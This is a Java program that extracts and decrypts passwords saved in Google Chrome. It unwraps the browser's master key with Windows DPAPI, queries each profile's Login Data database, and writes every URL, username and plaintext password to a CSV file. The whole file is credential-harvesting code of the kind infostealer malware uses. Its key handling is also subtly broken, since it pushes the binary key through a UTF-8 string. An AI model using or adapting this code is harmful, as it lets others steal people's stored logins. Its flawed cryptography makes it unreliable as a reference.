import com.sun.jna.Memory;
import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.win32.StdCallLibrary;
import org.json.JSONObject;
import org.json.JSONTokener;
import org.sqlite.SQLiteDataSource;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.BufferedWriter;
import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.regex.Pattern;

public class ChromePasswordDecryptor {

    private static final String CHROME_PATH_LOCAL_STATE = "/Users/name/Downloads/decrypt/Local State";
    private static final String CHROME_PATH = "/Users/name/Downloads/decrypt/User Data";

    public interface Crypt32 extends StdCallLibrary {
        boolean CryptUnprotectData(DataBlob pDataIn, Pointer ppszDataDescr, DataBlob pOptionalEntropy, Pointer pvReserved, Pointer pPromptStruct, int dwFlags, DataBlob pDataOut);
    }

    public static class DataBlob extends com.sun.jna.Structure {
        public int cbData;
        public Pointer pbData;

        public DataBlob() {
        }

        public DataBlob(byte[] data) {
            pbData = new Memory(data.length);
            pbData.write(0, data, 0, data.length);
            cbData = data.length;
        }

        @Override
        protected List<String> getFieldOrder() {
            return Arrays.asList("cbData", "pbData");
        }
    }

    public static String getSecretKey() throws IOException {
        String localState = new String(Files.readAllBytes(new File(CHROME_PATH_LOCAL_STATE).toPath()), StandardCharsets.UTF_8);
        JSONObject json = new JSONObject(new JSONTokener(localState));
        String encryptedKey = json.getJSONObject("os_crypt").getString("encrypted_key");
        byte[] key = Base64.getDecoder().decode(encryptedKey);
        key = Arrays.copyOfRange(key, 5, key.length);

        DataBlob inputBlob = new DataBlob(key);
        DataBlob outputBlob = new DataBlob();
        Crypt32 crypt32 = Native.load("Crypt32", Crypt32.class);
        if (crypt32.CryptUnprotectData(inputBlob, null, null, null, null, 0, outputBlob)) {
            return new String(outputBlob.pbData.getByteArray(0, outputBlob.cbData), StandardCharsets.UTF_8);
        } else {
            throw new IllegalStateException("Failed to decrypt secret key");
        }
    }

    public static String decryptPassword(byte[] encryptedPassword, byte[] key) throws Exception {
        byte[] iv = Arrays.copyOfRange(encryptedPassword, 3, 15);
        byte[] encryptedText = Arrays.copyOfRange(encryptedPassword, 15, encryptedPassword.length - 16);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        SecretKeySpec keySpec = new SecretKeySpec(key, "AES");
        GCMParameterSpec spec = new GCMParameterSpec(128, iv);
        cipher.init(Cipher.DECRYPT_MODE, keySpec, spec);

        return new String(cipher.doFinal(encryptedText), StandardCharsets.UTF_8);
    }

    public static Connection getDbConnection(String dbPath) throws IOException, SQLException, SQLException {
        File tempDb = new File("Loginvault.db");
        Files.copy(new File(dbPath).toPath(), tempDb.toPath(), StandardCopyOption.REPLACE_EXISTING);
        SQLiteDataSource dataSource = new SQLiteDataSource();
        dataSource.setUrl("jdbc:sqlite:" + tempDb.getAbsolutePath());
        return dataSource.getConnection();
    }

    public static void main(String[] args) {

        try (BufferedWriter writer = Files.newBufferedWriter(new File("decrypted_password.csv").toPath(), StandardCharsets.UTF_8)) {
            writer.write("index,url,username,password\n");

            String secretKey = getSecretKey();
            Pattern profilePattern = Pattern.compile("^Profile\\d+$|^Default$");

            File[] profileDirs = new File(CHROME_PATH).listFiles(file -> profilePattern.matcher(file.getName()).matches());
            if (profileDirs != null) {
                for (File profileDir : profileDirs) {
                    String loginDbPath = profileDir.getAbsolutePath() + "/Login Data";
                    try (Connection conn = getDbConnection(loginDbPath);
                         Statement stmt = conn.createStatement();
                         ResultSet rs = stmt.executeQuery("SELECT action_url, username_value, password_value FROM logins")) {

                        int index = 0;
                        while (rs.next()) {
                            String url = rs.getString("action_url");
                            String username = rs.getString("username_value");
                            byte[] passwordBytes = rs.getBytes("password_value");

                            if (url != null && !url.isEmpty() && username != null && !username.isEmpty() && passwordBytes != null && passwordBytes.length > 0) {
                                String decryptedPassword = decryptPassword(passwordBytes, secretKey.getBytes(StandardCharsets.UTF_8));
                                writer.write(String.format("%d,%s,%s,%s%n", index++, url, username, decryptedPassword));
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}